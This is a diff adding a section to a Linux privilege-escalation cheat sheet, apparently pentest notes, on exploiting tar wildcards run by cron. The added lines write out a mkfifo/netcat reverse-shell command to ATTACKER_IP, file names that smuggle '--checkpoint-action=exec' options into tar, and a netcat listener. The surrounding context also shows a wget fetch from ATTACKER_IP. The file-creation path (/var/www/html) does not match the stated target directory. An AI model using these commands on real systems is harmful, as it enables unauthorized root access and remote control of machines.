@@ -54,6 +54,23 @@ wget ATTACKER_IP:PORT/FILE
     - Is the directory writeable? (Renaming possible)
 - Cron jobs are usually stored at /etc/cron.d 
 
+##### tar issues with wildcards
+- If tar is used to create archives with wildcards (*) this can be exploited by placing new files in the directory:
+    ```bash
+    #!/bin/bash
+    cd /some/directory
+    tar cf /some/output/path/file.tgz *
+    ```
+    - Create the files in `/some/directory/`:
+        ```bash
+        echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f" > shell.sh
+        touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
+        touch "/var/www/html/--checkpoint=1"
+        ```
+    - Start nc listener: `nc -lnvp PORT`
+    - Wait for the script to be run by the cron daemon
+
+
 #### SUID/SGID files
 ```bash
 # List files that have SUID or SGID bits set
